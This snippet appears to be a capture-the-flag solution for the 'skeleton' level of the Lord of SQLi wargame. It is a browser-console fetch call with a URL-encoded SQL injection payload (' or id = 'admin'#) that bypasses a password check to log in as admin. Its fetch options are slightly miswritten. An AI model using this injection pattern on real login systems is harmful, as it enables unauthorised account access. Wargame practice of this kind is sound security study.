// On the chrome console window
fetch('https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27%20or%20id%20=%20%27admin%27%23', {
    include: 'credentials'
  }
).then((x) => x.text()).then((x) => console.log(x));
